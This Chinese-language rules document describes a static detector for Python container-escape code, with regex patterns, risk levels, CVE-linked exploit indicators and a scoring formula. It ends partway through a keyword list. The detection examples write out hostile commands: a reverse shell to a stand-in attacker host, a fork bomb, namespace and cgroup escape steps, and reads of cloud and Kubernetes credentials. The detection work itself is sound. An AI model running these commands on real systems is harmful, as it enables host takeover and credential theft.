# Python容器逃逸静态检测规则文档 v2.0

## 文档信息


| 项目     | 内容                             |
| ---------- | ---------------------------------- |
| 版本     | v2.0                             |
| 更新日期 | 2026年1月14日                    |
| 适用工具 | semantic_feature_extractor_v3.py |
| 目标场景 | 海洋科学云计算平台容器安全检测   |

---

## 1. 概述

- 敏感模块和函数定义（CONTAINER_ESCAPE_MODULES）
- 攻击模式正则表达式（CONTAINER_ESCAPE_PATTERNS）
- 风险等级分类（ESCAPE_RISK_RULES）
- 混淆检测规则（OBFUSCATION_PATTERNS）

---

## 2. 敏感模块和函数定义

### 2.1 系统命令执行类


| 模块       | 敏感函数                                                                                                           | 风险说明                             |
| ------------ | -------------------------------------------------------------------------------------------------------------------- | -------------------------------------- |
| os         | system, popen, spawn*, exec*, fork, forkpty, dup, dup2, mknod, mount, umount, chroot, fchdir, setuid, setgid, kill | 直接执行系统命令，可能被用于容器逃逸 |
| subprocess | run, call, check_call, check_output, Popen, getoutput                                                              | 创建子进程执行命令                   |
| commands   | getoutput, getstatusoutput                                                                                         | 旧版命令执行接口                     |
| shlex      | split, quote                                                                                                       | 命令行参数处理                       |

### 2.2 网络操作类


| 模块                  | 敏感函数                                                   | 风险说明                                        |
| ----------------------- | ------------------------------------------------------------ | ------------------------------------------------- |
| socket                | socket, connect, bind, accept, listen, AF_UNIX, AF_NETLINK | 网络通信，可用于连接Docker Socket或云元数据服务 |
| urllib/urllib.request | urlopen, Request, urlretrieve                              | HTTP请求，可访问云元数据                        |
| requests              | get, post, put, delete, Session                            | HTTP客户端库                                    |
| http.client           | HTTPConnection, HTTPSConnection                            | 底层HTTP连接                                    |

### 2.3 危险库调用类


| 模块              | 敏感函数                                     | 风险说明                    |
| ------------------- | ---------------------------------------------- | ----------------------------- |
| ctypes            | CDLL, cdll, memmove, memset, cast, pointer   | 加载C库，可调用底层系统调用 |
| cffi              | FFI, dlopen                                  | 外部函数接口                |
| docker            | from_env, DockerClient, APIClient            | Docker SDK，可操控容器      |
| kubernetes.client | CoreV1Api, AppsV1Api, RbacAuthorizationV1Api | K8s客户端，可操控集群       |

### 2.4 进程和线程类


| 模块            | 敏感函数                      | 风险说明                    |
| ----------------- | ------------------------------- | ----------------------------- |
| multiprocessing | Process, Pool, Queue, Pipe    | 多进程操作                  |
| threading       | Thread, Timer, Lock           | 多线程操作                  |
| pty             | spawn, fork, openpty          | 伪终端操作，常用于反弹Shell |
| fcntl           | fcntl, ioctl, flock           | 文件控制操作                |
| resource        | setrlimit, getrlimit, prlimit | 资源限制操作                |

### 2.5 序列化类（代码注入风险）


| 模块    | 敏感函数                     | 风险说明               |
| --------- | ------------------------------ | ------------------------ |
| pickle  | load, loads, Unpickler       | 反序列化可执行任意代码 |
| yaml    | load, unsafe_load, full_load | YAML反序列化漏洞       |
| marshal | load, loads                  | 字节码反序列化         |
| dill    | load, loads                  | 扩展pickle功能         |

### 2.6 动态执行类


| 模块      | 敏感函数                            | 风险说明       |
| ----------- | ------------------------------------- | ---------------- |
| importlib | import_module,__import__, reload    | 动态导入模块   |
| imp       | load_module, load_source            | 旧版动态导入   |
| runpy     | run_module, run_path                | 运行模块/脚本  |
| code      | compile_command, InteractiveConsole | 交互式代码执行 |

### 2.7 编码解码类（混淆检测）


| 模块               | 敏感函数                                     | 风险说明                 |
| -------------------- | ---------------------------------------------- | -------------------------- |
| base64             | b64decode, decodebytes, b16decode, b32decode | Base64解码，常用于混淆   |
| codecs             | decode, encode, getdecoder                   | 编码转换                 |
| binascii           | unhexlify, a2b_hex, a2b_base64               | 二进制转换               |
| zlib/gzip/bz2/lzma | decompress, open                             | 压缩解压，可隐藏恶意代码 |

---

## 3. 攻击模式详细清单（CONTAINER_ESCAPE_PATTERNS）

### 3.1 CE-CMD: 系统命令执行类

#### CE-CMD-01: 敏感二进制命令调用

```
模式名称: cmd_sensitive_binary
正则表达式: \b(nsenter|capsh|mount|umount|docker|kubectl|crictl|ctr|runc|containerd|podman|nerdctl|buildah|skopeo)\b
风险等级: HIGH
攻击意图: 调用容器运行时或特权工具进行逃逸
检测示例:
  - os.system("nsenter -t 1 -m -u -i -n -p /bin/bash")
  - subprocess.run(["docker", "exec", "-it", "host", "/bin/sh"])
  - os.popen("kubectl exec -it pod -- /bin/bash")
```

#### CE-CMD-02: 反弹Shell特征

```
模式名称: cmd_reverse_shell
正则表达式: (os\.dup2\s*\([^)]*fileno[^)]*,\s*[012]\s*\)|pty\.spawn\s*\(\s*['\"][^'\"]*(?:sh|bash|zsh|ksh|csh)['\"]|/dev/tcp/|nc\s+-[elp]|bash\s+-i\s*>&|python\s+-c\s*['\"]import\s+socket)
风险等级: HIGH
攻击意图: 建立反向Shell连接，获取交互式访问
检测示例:
  - os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
  - pty.spawn("/bin/bash")
  - bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

#### CE-CMD-03: Fork炸弹

```
模式名称: cmd_fork_bomb
正则表达式: (os\.fork\s*\(\s*\)|while\s+True\s*:\s*os\.fork|:\(\)\s*\{\s*:\|:\s*&\s*\})
风险等级: MEDIUM
攻击意图: 资源耗尽攻击，导致拒绝服务
检测示例:
  - while True: os.fork()
  - :(){ :|:& };:
```

#### CE-CMD-04: 特权命令执行

```
模式名称: cmd_privilege_exec
正则表达式: \b(sudo|su\s+-|chroot|unshare|setns|pivot_root)\b
风险等级: HIGH
攻击意图: 提升权限或切换命名空间
检测示例:
  - os.system("sudo /bin/bash")
  - subprocess.run(["unshare", "-m", "-p", "-f", "/bin/bash"])
  - os.system("chroot /host /bin/bash")
```

#### CE-CMD-05: 内核模块操作

```
模式名称: cmd_kernel_module
正则表达式: \b(insmod|rmmod|modprobe|lsmod|modinfo)\b
风险等级: MEDIUM
攻击意图: 加载恶意内核模块
检测示例:
  - os.system("insmod rootkit.ko")
  - subprocess.run(["modprobe", "malicious_module"])
```

### 3.2 CE-FILE: 文件与路径操作类

#### CE-FILE-01: 容器环境指纹探测

```
模式名称: file_container_fingerprint
正则表达式: (/\.dockerenv|/proc/1/cgroup|/proc/self/cgroup|/proc/self/status|/proc/self/mountinfo|/proc/1/sched|/proc/1/attr/current)
风险等级: CRITICAL
攻击意图: 探测是否在容器环境中运行，为后续逃逸做准备
检测示例:
  - open("/.dockerenv", "r")
  - with open("/proc/1/cgroup") as f: cgroup_info = f.read()
  - os.path.exists("/proc/self/cgroup")
```

#### CE-FILE-02: 宿主机敏感路径访问

```
模式名称: file_host_sensitive
正则表达式: (/host/|/hostfs/|/proc/1/root|/proc/1/ns/|/var/run/docker\.sock|/var/run/containerd\.sock|/run/containerd/containerd\.sock|/var/run/crio/crio\.sock|/var/run/secrets)
风险等级: CRITICAL
攻击意图: 访问宿主机文件系统或容器运行时Socket
检测示例:
  - socket.connect("/var/run/docker.sock")
  - open("/proc/1/root/etc/shadow", "r")
  - os.listdir("/host/")
```

#### CE-FILE-03: Cgroup和内核配置

```
模式名称: file_cgroup_kernel
正则表达式: (/sys/fs/cgroup|/proc/sys/kernel/core_pattern|/proc/sys/kernel/modprobe|release_agent|devices\.allow|devices\.deny|notify_on_release|cgroup\.procs)
风险等级: HIGH
攻击意图: 利用Cgroup机制或修改内核配置进行逃逸
检测示例:
  - open("/sys/fs/cgroup/memory/release_agent", "w")
  - with open("/proc/sys/kernel/core_pattern", "w") as f: f.write("|/path/to/exploit")
  - echo 1 > notify_on_release
```

#### CE-FILE-04: /proc/self敏感文件

```
模式名称: file_proc_self
正则表达式: (/proc/self/exe|/proc/self/mem|/proc/self/fd/|/proc/self/maps|/proc/self/pagemap|/proc/self/syscall|/proc/\d+/exe|/proc/\d+/mem)
风险等级: HIGH
攻击意图: 访问进程内存或执行文件，可用于runc逃逸
检测示例:
  - open("/proc/self/exe", "rb")
  - with open("/proc/self/mem", "r+b") as f: f.seek(addr); f.write(shellcode)
  - os.readlink("/proc/1/exe")
```

#### CE-FILE-05: K8s凭证路径

```
模式名称: file_k8s_secrets
正则表达式: (/var/run/secrets/kubernetes\.io/serviceaccount|/var/run/secrets/eks\.amazonaws\.com|\.kube/config|kubeconfig|/etc/kubernetes/)
风险等级: HIGH
攻击意图: 窃取K8s服务账户Token或配置文件
检测示例:
  - open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r")
  - with open(os.path.expanduser("~/.kube/config")) as f: config = f.read()
  - os.listdir("/etc/kubernetes/pki/")
```

#### CE-FILE-06: 云凭证路径

```
模式名称: file_cloud_creds
正则表达式: (\.aws/credentials|\.aws/config|\.azure/|\.config/gcloud|/etc/boto\.cfg|instance/computeMetadata)
风险等级: HIGH
攻击意图: 窃取云服务商凭证
检测示例:
  - open(os.path.expanduser("~/.aws/credentials"), "r")
  - with open("/root/.config/gcloud/credentials.db", "rb") as f: creds = f.read()
```

#### CE-FILE-07: 设备文件访问

```
模式名称: file_device_access
正则表达式: (/dev/mem|/dev/kmem|/dev/port|/dev/sda|/dev/vda|/dev/nvme|/dev/disk/|/dev/mapper/)
风险等级: CRITICAL
攻击意图: 直接访问物理内存或磁盘设备
检测示例:
  - open("/dev/mem", "r+b")
  - with open("/dev/sda", "rb") as f: mbr = f.read(512)
  - os.mknod("/dev/sda1", 0o660 | stat.S_IFBLK, os.makedev(8, 1))
```

### 3.3 CE-LIB: 危险库调用类

#### CE-LIB-01: Ctypes加载Libc

```
模式名称: lib_ctypes_libc
正则表达式: ctypes\.(CDLL|cdll|WinDLL)\s*\(\s*['\"](?:libc\.so|libpthread|libdl|librt|libnss|libpam)
风险等级: CRITICAL
攻击意图: 通过ctypes调用底层C库函数，绕过Python安全限制
检测示例:
  - libc = ctypes.CDLL("libc.so.6")
  - libc.setns(fd, CLONE_NEWNS)
  - libc.unshare(CLONE_NEWNS | CLONE_NEWPID)
```

#### CE-LIB-02: 敏感系统调用

```
模式名称: lib_syscall
正则表达式: \b(setns|unshare|clone|mount|umount|pivot_root|ptrace|process_vm_readv|process_vm_writev|madvise|splice|vmsplice|tee|copy_file_range|memfd_create|execveat|seccomp|prctl|capset|capget)\b
风险等级: CRITICAL
攻击意图: 直接调用Linux系统调用进行逃逸
检测示例:
  - libc.setns(fd, CLONE_NEWNS)
  - libc.unshare(CLONE_NEWPID | CLONE_NEWNS)
  - libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
```

#### CE-LIB-03: Docker SDK滥用

```
模式名称: lib_docker_sdk
正则表达式: (docker\.(from_env|DockerClient|APIClient)|import\s+docker)
风险等级: HIGH
攻击意图: 通过Docker SDK操控容器或宿主机
检测示例:
  - client = docker.from_env()
  - client.containers.run("alpine", "cat /etc/shadow", volumes={'/': {'bind': '/host'}})
```

#### CE-LIB-04: K8s Client滥用

```
模式名称: lib_k8s_client
正则表达式: (kubernetes\.client\.\w+Api|from\s+kubernetes\s+import|kubernetes\.config\.load)
风险等级: HIGH
攻击意图: 通过K8s客户端操控集群资源
检测示例:
  - from kubernetes import client, config
  - v1 = client.CoreV1Api()
  - v1.create_namespaced_pod(namespace="default", body=privileged_pod)
```

#### CE-LIB-05: 内存操作

```
模式名称: lib_memory_ops
正则表达式: (ctypes\.memmove|ctypes\.memset|mmap\.mmap|ctypes\.cast|ctypes\.pointer)
风险等级: HIGH
攻击意图: 直接操作内存，可能用于漏洞利用
检测示例:
  - ctypes.memmove(dst, src, size)
  - mm = mmap.mmap(-1, 4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
```

### 3.4 CE-NET: 网络行为类

#### CE-NET-01: 云元数据服务请求

```
模式名称: net_cloud_metadata
正则表达式: (169\.254\.169\.254|100\.100\.100\.200|metadata\.google\.internal|169\.254\.170\.2|fd00:ec2::254)
风险等级: HIGH
攻击意图: 访问云元数据服务获取实例凭证
检测示例:
  - requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  - urllib.request.urlopen("http://100.100.100.200/latest/meta-data/")
  - curl http://metadata.google.internal/computeMetadata/v1/
```

#### CE-NET-02: K8s组件端口

```
模式名称: net_k8s_ports
正则表达式: (:10250|:10255|:10256|:2375|:2376|:2379|:2380|:6443|:8080|:8443|:9090|:9100|KUBERNETES_SERVICE_HOST|KUBERNETES_PORT)
风险等级: HIGH
攻击意图: 访问K8s API Server或Kubelet端口
检测示例:
  - requests.get("https://kubernetes.default.svc:6443/api/v1/namespaces")
  - socket.connect(("10.0.0.1", 10250))
  - os.environ.get("KUBERNETES_SERVICE_HOST")
```

#### CE-NET-03: 本地回环绕过

```
模式名称: net_localhost_bypass
正则表达式: (127\.0\.0\.1|localhost|0\.0\.0\.0)\s*[,:\"]?\s*(?:10250|10255|2375|6443|8080)
风险等级: MEDIUM
攻击意图: 通过本地回环地址访问敏感服务
检测示例:
  - requests.get("http://127.0.0.1:10255/pods")
  - socket.connect(("localhost", 2375))
```

#### CE-NET-04: Unix Socket连接

```
模式名称: net_unix_socket
正则表达式: (socket\.AF_UNIX|unix://|/var/run/.*\.sock|\.socket\s*\(\s*socket\.AF_UNIX)
风险等级: HIGH
攻击意图: 连接Docker/Containerd等运行时的Unix Socket
检测示例:
  - sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
  - sock.connect("/var/run/docker.sock")
  - requests.get("http+unix://%2Fvar%2Frun%2Fdocker.sock/containers/json")
```

#### CE-NET-05: Netlink Socket

```
模式名称: net_netlink
正则表达式: (socket\.AF_NETLINK|NETLINK_KOBJECT_UEVENT|NETLINK_AUDIT)
风险等级: MEDIUM
攻击意图: 通过Netlink与内核通信
检测示例:
  - sock = socket.socket(socket.AF_NETLINK, socket.SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)
```

### 3.5 CE-EXPLOIT: 漏洞利用类

#### CE-EXPLOIT-01: Dirty COW (CVE-2016-5195)

```
模式名称: exploit_dirty_cow
正则表达式: (madvise\s*\([^)]*MADV_DONTNEED|MAP_PRIVATE\s*\|\s*PROT_READ|/proc/self/mem.*write|ptrace.*POKETEXT)
风险等级: CRITICAL
CVE编号: CVE-2016-5195
CVSS评分: 7.8 (HIGH)
攻击意图: 利用Linux内核写时复制漏洞提权
漏洞原理: 竞态条件导致只读内存映射可被写入
检测示例:
  - madvise(map, size, MADV_DONTNEED)
  - mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0)
  - open("/proc/self/mem", "r+b")
```

#### CE-EXPLOIT-02: Dirty Pipe (CVE-2022-0847)

```
模式名称: exploit_dirty_pipe
正则表达式: (splice\s*\(|PIPE_BUF_FLAG|F_SETPIPE_SZ|pipe2?\s*\([^)]*O_DIRECT)
风险等级: CRITICAL
CVE编号: CVE-2022-0847
CVSS评分: 7.8 (HIGH)
攻击意图: 利用Linux管道漏洞覆盖任意只读文件
漏洞原理: pipe缓冲区标志位未正确初始化
检测示例:
  - splice(fd_in, NULL, pipefd[1], NULL, 1, 0)
  - fcntl(pipefd[1], F_SETPIPE_SZ, 4096)
  - pipe2(pipefd, O_DIRECT)
```

#### CE-EXPLOIT-03: runc逃逸 (CVE-2019-5736)

```
模式名称: exploit_runc
正则表达式: (#!/proc/self/exe|/proc/\d+/exe.*O_WRONLY|/proc/self/fd/\d+.*runc|overwrite.*runc)
风险等级: CRITICAL
CVE编号: CVE-2019-5736
CVSS评分: 8.6 (HIGH)
攻击意图: 覆盖宿主机上的runc二进制文件
漏洞原理: 容器内进程可通过/proc/self/exe访问runc
检测示例:
  - #!/proc/self/exe
  - open("/proc/1/exe", os.O_WRONLY)
  - fd = open("/proc/self/fd/3", "w")  # 指向runc
```

#### CE-EXPLOIT-04: Cgroup Release Agent

```
模式名称: exploit_cgroup_release
正则表达式: (release_agent|notify_on_release\s*=\s*1|cgroup\.procs.*echo|/sys/fs/cgroup.*mkdir)
风险等级: CRITICAL
攻击意图: 利用Cgroup release_agent机制在宿主机执行命令
漏洞原理: 当Cgroup中最后一个进程退出时，内核会执行release_agent
检测示例:
  - echo "/path/to/exploit.sh" > /sys/fs/cgroup/x/release_agent
  - echo 1 > /sys/fs/cgroup/x/notify_on_release
  - echo $$ > /sys/fs/cgroup/x/cgroup.procs
```

#### CE-EXPLOIT-05: Hotplug劫持

```
模式名称: exploit_hotplug
正则表达式: (/sys/kernel/uevent_helper|/proc/sys/kernel/hotplug|kobject_uevent|uevent.*ACTION)
风险等级: HIGH
攻击意图: 劫持内核热插拔事件处理程序
漏洞原理: 修改uevent_helper可在设备事件时执行任意命令
检测示例:
  - echo "/path/to/exploit.sh" > /sys/kernel/uevent_helper
  - with open("/proc/sys/kernel/hotplug", "w") as f: f.write("/exploit.sh")
```

#### CE-EXPLOIT-06: containerd-shim (CVE-2020-15257)

```
模式名称: exploit_containerd_shim
正则表达式: (containerd-shim|abstract.*socket|\\x00/containerd-shim)
风险等级: CRITICAL
CVE编号: CVE-2020-15257
CVSS评分: 5.2 (MEDIUM)
攻击意图: 通过containerd-shim的抽象Unix Socket逃逸
漏洞原理: containerd-shim API可被容器内进程访问
检测示例:
  - sock.connect("\x00/containerd-shim/...")
  - socket.connect(("", 0), socket.AF_UNIX)  # 抽象socket
```

#### CE-EXPLOIT-07: Docker cp (CVE-2019-14271)

```
模式名称: exploit_docker_cp
正则表达式: (libnss_files\.so|libnss_dns\.so|docker.*cp|nsswitch\.conf)
风险等级: HIGH
CVE编号: CVE-2019-14271
CVSS评分: 9.8 (CRITICAL)
攻击意图: 通过docker cp命令在宿主机执行代码
漏洞原理: docker cp加载容器内的libnss库
检测示例:
  - 在容器内创建恶意 /lib/x86_64-linux-gnu/libnss_files.so.2
  - docker cp container:/path /host/path  # 触发漏洞
```

#### CE-EXPLOIT-08: fsconfig漏洞 (CVE-2022-0185)

```
模式名称: exploit_fsconfig
正则表达式: (fsconfig|fsopen|fsmount|move_mount|open_tree)
风险等级: CRITICAL
CVE编号: CVE-2022-0185
CVSS评分: 8.4 (HIGH)
攻击意图: 利用文件系统上下文API进行堆溢出
漏洞原理: fsconfig系统调用存在整数溢出
检测示例:
  - libc.fsopen("ext4", FSOPEN_CLOEXEC)
  - libc.fsconfig(fd, FSCONFIG_SET_STRING, "source", "/dev/sda1", 0)
  - libc.fsmount(fd, FSMOUNT_CLOEXEC, 0)
```

#### CE-EXPLOIT-09: Cgroup v1漏洞 (CVE-2022-0492)

```
模式名称: exploit_cgroup_v1
正则表达式: (cgroup\.clone_children|cgroup\.subtree_control|release_agent.*upperdir)
风险等级: MEDIUM
CVE编号: CVE-2022-0492
CVSS评分: 7.8 (HIGH)
攻击意图: 利用Cgroup v1的release_agent进行逃逸
漏洞原理: 非特权用户可设置release_agent
检测示例:
  - echo 1 > /sys/fs/cgroup/rdma/cgroup.clone_children
  - mkdir /sys/fs/cgroup/rdma/x && echo 1 > x/notify_on_release
```

#### CE-EXPLOIT-10: Netfilter漏洞 (CVE-2021-22555)

```
模式名称: exploit_netfilter
正则表达式: (setsockopt.*IPT_SO_SET|xt_compat|nf_tables|NFPROTO)
风险等级: MEDIUM
CVE编号: CVE-2021-22555
CVSS评分: 7.8 (HIGH)
攻击意图: 利用Netfilter堆越界写漏洞提权
漏洞原理: xt_compat结构体处理存在越界写
检测示例:
  - setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, ...)
  - libc.setsockopt(sock, IPPROTO_IP, 64, payload, len(payload))
```

### 3.6 CE-K8S: K8s持久化类

#### CE-K8S-01: 特权Pod配置

```
模式名称: k8s_privileged_pod
正则表达式: (hostNetwork\s*:\s*true|hostPID\s*:\s*true|hostIPC\s*:\s*true|privileged\s*:\s*true|allowPrivilegeEscalation\s*:\s*true)
风险等级: HIGH
攻击意图: 创建特权Pod获取宿主机访问权限
检测示例:
  - securityContext: { privileged: true }
  - hostNetwork: true
  - hostPID: true
```

#### CE-K8S-02: HostPath挂载

```
模式名称: k8s_hostpath_mount
正则表达式: (hostPath\s*:\s*\n?\s*path\s*:\s*/|volumeMounts.*hostPath|type\s*:\s*DirectoryOrCreate)
风险等级: HIGH
攻击意图: 通过HostPath挂载访问宿主机文件系统
检测示例:
  - volumes: [{ hostPath: { path: "/" } }]
  - volumeMounts: [{ mountPath: "/host", name: "hostfs" }]
```

#### CE-K8S-03: ServiceAccount滥用

```
模式名称: k8s_service_account
正则表达式: (serviceAccountName\s*:|automountServiceAccountToken\s*:\s*true|system:serviceaccount)
风险等级: MEDIUM
攻击意图: 利用ServiceAccount Token访问K8s API
检测示例:
  - serviceAccountName: cluster-admin
  - automountServiceAccountToken: true
```

#### CE-K8S-04: ExternalIPs劫持

```
模式名称: k8s_external_ips
正则表达式: (externalIPs\s*:|externalTrafficPolicy|LoadBalancer)
风险等级: MEDIUM
攻击意图: 通过ExternalIPs劫持流量
检测示例:
  - spec: { externalIPs: ["192.168.1.1"] }
```

#### CE-K8S-05: RBAC提权

```
模式名称: k8s_rbac_escalation
正则表达式: (ClusterRole|ClusterRoleBinding|escalate|impersonate|bind.*role)
风险等级: MEDIUM
攻击意图: 通过RBAC配置提升权限
检测示例:
  - kind: ClusterRoleBinding
  - verbs: ["escalate", "impersonate", "bind"]
```

#### CE-K8S-06: 恶意Webhook

```
模式名称: k8s_webhook
正则表达式: (MutatingWebhook|ValidatingWebhook|admissionregistration)
风险等级: LOW
攻击意图: 注册恶意Webhook拦截API请求
检测示例:
  - kind: MutatingWebhookConfiguration
  - apiVersion: admissionregistration.k8s.io/v1
```

### 3.7 CE-CRED: 凭证窃取类

#### CE-CRED-01: 云厂商AK/SK

```
模式名称: cred_cloud_ak
正则表达式: (AKIA[0-9A-Z]{16}|ABIA[0-9A-Z]{16}|ACCA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{20}|AKID[0-9A-Za-z]{32})
风险等级: HIGH
攻击意图: 窃取云服务商Access Key
检测示例:
  - AWS: AKIAIOSFODNN7EXAMPLE
  - 阿里云: LTAI4FoLmvLC9wZMiDxS
  - 腾讯云: AKIDz8krbsJ5yKBZQpn74WFkmLPx3EXAMPLE
```

#### CE-CRED-02: SSH私钥

```
模式名称: cred_ssh_key
正则表达式: (-----BEGIN\s+(RSA|DSA|EC|OPENSSH|ENCRYPTED)\s+PRIVATE\s+KEY-----|ssh-rsa\s+AAAA|ssh-ed25519\s+AAAA)
风险等级: HIGH
攻击意图: 窃取SSH私钥用于横向移动
检测示例:
  - -----BEGIN RSA PRIVATE KEY-----
  - -----BEGIN OPENSSH PRIVATE KEY-----
```

#### CE-CRED-03: Docker配置

```
模式名称: cred_docker_config
正则表达式: (\.docker/config\.json|\.dockercfg|docker.*auth.*base64)
风险等级: MEDIUM
攻击意图: 窃取Docker Registry认证信息
检测示例:
  - open("~/.docker/config.json", "r")
  - "auth": "dXNlcm5hbWU6cGFzc3dvcmQ="
```

#### CE-CRED-04: K8s Token

```
模式名称: cred_k8s_token
正则表达式: (eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9|serviceaccount.*token|bearer\s+token)
风险等级: HIGH
攻击意图: 窃取K8s ServiceAccount Token
检测示例:
  - Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
  - open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r")
```

#### CE-CRED-05: 数据库凭证

```
模式名称: cred_database
正则表达式: (mysql://|postgres://|mongodb://|redis://|password\s*=\s*['\"][^'\"]+['\"])
风险等级: MEDIUM
攻击意图: 窃取数据库连接凭证
检测示例:
  - mysql://root:password@localhost:3306/db
  - password = "secret123"
```

### 3.8 CE-DOS: DoS攻击类

#### CE-DOS-01: 无限循环

```
模式名称: dos_infinite_loop
正则表达式: (while\s+True\s*:|while\s+1\s*:|for\s+_\s+in\s+iter\s*\(\s*int\s*,\s*1\s*\))
风险等级: LOW
攻击意图: 通过无限循环消耗CPU资源
检测示例:
  - while True: pass
  - while 1: do_something()
```

#### CE-DOS-02: 资源耗尽

```
模式名称: dos_resource_exhaust
正则表达式: (fork\s*\(\s*\).*while|Process\s*\(.*while|Thread\s*\(.*while|['\"]A['\"].*\*.*\d{6,})
风险等级: LOW
攻击意图: 通过大量进程/线程或内存分配耗尽资源
检测示例:
  - while True: os.fork()
  - while True: Process(target=func).start()
  - data = "A" * 10000000
```

#### CE-DOS-03: 文件描述符耗尽

```
模式名称: dos_fd_exhaust
正则表达式: (open\s*\([^)]+\).*while|socket\.socket.*while|os\.dup\s*\(.*while)
风险等级: LOW
攻击意图: 通过大量打开文件/Socket耗尽文件描述符
检测示例:
  - while True: open("/dev/null", "r")
  - while True: socket.socket()
```

---

## 4. 风险等级分类（ESCAPE_RISK_RULES）

### 4.1 风险等级定义


| 等级     | 分数权重 | 说明                                   |
| ---------- | ---------- | ---------------------------------------- |
| CRITICAL | 10       | 直接导致容器逃逸的高危行为，需立即阻断 |
| HIGH     | 5        | 高风险行为，可能导致逃逸或信息泄露     |
| MEDIUM   | 2        | 中等风险，需要结合其他条件才能利用     |
| LOW      | 1        | 低风险，可能是正常行为但需要关注       |

### 4.2 风险等级映射表

#### CRITICAL级别（直接逃逸风险）


| 规则ID        | 攻击模式                   | 说明                     |
| --------------- | ---------------------------- | -------------------------- |
| CE-FILE-01    | file_container_fingerprint | 容器指纹探测（逃逸前置） |
| CE-FILE-02    | file_host_sensitive        | 宿主机敏感路径访问       |
| CE-FILE-07    | file_device_access         | 设备文件访问             |
| CE-LIB-01     | lib_ctypes_libc            | Ctypes加载Libc           |
| CE-LIB-02     | lib_syscall                | 敏感系统调用             |
| CE-EXPLOIT-01 | exploit_dirty_cow          | Dirty COW漏洞            |
| CE-EXPLOIT-02 | exploit_dirty_pipe         | Dirty Pipe漏洞           |
| CE-EXPLOIT-03 | exploit_runc               | runc逃逸漏洞             |
| CE-EXPLOIT-04 | exploit_cgroup_release     | Cgroup Release Agent     |
| CE-EXPLOIT-06 | exploit_containerd_shim    | containerd-shim漏洞      |
| CE-EXPLOIT-08 | exploit_fsconfig           | fsconfig漏洞             |

#### HIGH级别（高风险行为）


| 规则ID        | 攻击模式             | 说明               |
| --------------- | ---------------------- | -------------------- |
| CE-CMD-01     | cmd_sensitive_binary | 敏感二进制命令     |
| CE-CMD-02     | cmd_reverse_shell    | 反弹Shell          |
| CE-CMD-04     | cmd_privilege_exec   | 特权命令执行       |
| CE-FILE-03    | file_cgroup_kernel   | Cgroup/内核配置    |
| CE-FILE-04    | file_proc_self       | /proc/self敏感文件 |
| CE-FILE-05    | file_k8s_secrets     | K8s凭证路径        |
| CE-FILE-06    | file_cloud_creds     | 云凭证路径         |
| CE-LIB-03     | lib_docker_sdk       | Docker SDK         |
| CE-LIB-04     | lib_k8s_client       | K8s Client         |
| CE-LIB-05     | lib_memory_ops       | 内存操作           |
| CE-NET-01     | net_cloud_metadata   | 云元数据服务       |
| CE-NET-02     | net_k8s_ports        | K8s组件端口        |
| CE-NET-04     | net_unix_socket      | Unix Socket        |
| CE-EXPLOIT-05 | exploit_hotplug      | Hotplug劫持        |
| CE-EXPLOIT-07 | exploit_docker_cp    | Docker cp漏洞      |
| CE-EXPLOIT-09 | exploit_cgroup_v1    | Cgroup v1漏洞      |
| CE-K8S-01     | k8s_privileged_pod   | 特权Pod            |
| CE-K8S-02     | k8s_hostpath_mount   | HostPath挂载       |
| CE-CRED-01    | cred_cloud_ak        | 云AK/SK            |
| CE-CRED-02    | cred_ssh_key         | SSH私钥            |
| CE-CRED-04    | cred_k8s_token       | K8s Token          |

#### MEDIUM级别（中等风险）


| 规则ID        | 攻击模式             | 说明           |
| --------------- | ---------------------- | ---------------- |
| CE-CMD-03     | cmd_fork_bomb        | Fork炸弹       |
| CE-CMD-05     | cmd_kernel_module    | 内核模块操作   |
| CE-NET-03     | net_localhost_bypass | 本地回环绕过   |
| CE-NET-05     | net_netlink          | Netlink Socket |
| CE-K8S-03     | k8s_service_account  | ServiceAccount |
| CE-K8S-04     | k8s_external_ips     | ExternalIPs    |
| CE-K8S-05     | k8s_rbac_escalation  | RBAC提权       |
| CE-CRED-03    | cred_docker_config   | Docker配置     |
| CE-CRED-05    | cred_database        | 数据库凭证     |
| CE-EXPLOIT-10 | exploit_netfilter    | Netfilter漏洞  |

#### LOW级别（低风险）


| 规则ID    | 攻击模式             | 说明           |
| ----------- | ---------------------- | ---------------- |
| CE-DOS-01 | dos_infinite_loop    | 无限循环       |
| CE-DOS-02 | dos_resource_exhaust | 资源耗尽       |
| CE-DOS-03 | dos_fd_exhaust       | 文件描述符耗尽 |
| CE-K8S-06 | k8s_webhook          | Webhook        |

### 4.3 风险评分计算

```python
# 风险分数计算公式
risk_score = (
    len(CRITICAL_indicators) * 10 +
    len(HIGH_indicators) * 5 +
    len(MEDIUM_indicators) * 2 +
    len(LOW_indicators) * 1
)

# 风险等级判定
if risk_score >= 20 or len(CRITICAL_indicators) >= 2:
    overall_risk = "CRITICAL"
elif risk_score >= 10 or len(HIGH_indicators) >= 2:
    overall_risk = "HIGH"
elif risk_score >= 5 or len(MEDIUM_indicators) >= 2:
    overall_risk = "MEDIUM"
elif risk_score > 0:
    overall_risk = "LOW"
else:
    overall_risk = "SAFE"
```

---

## 5. 混淆检测规则（OBFUSCATION_PATTERNS）

### 5.1 混淆检测目的

**核心场景**：

```python
# 攻击者技巧：将敏感路径 base64 编码，绕过静态文本扫描
# L3Zhci9ydW4vZG9ja2VyLnNvY2s=  -> /var/run/docker.sock
# L3Byb2Mva2NvcmU=              -> /proc/kcore
# L2hvbWUvYWRtaW4=              -> /home/admin

import base64
path = base64.b64decode("L3Zhci9ydW4vZG9ja2VyLnNvY2s=").decode()
sock.connect(path)  # 实际连接 /var/run/docker.sock
```

### 5.2 敏感关键词列表

```python
ESCAPE_SENSITIVE_KEYWORDS = [
    # 敏感路径
    "/var/run/docker.sock", "/proc/kcore", "/proc/self/mem", "/proc/1/cgroup",
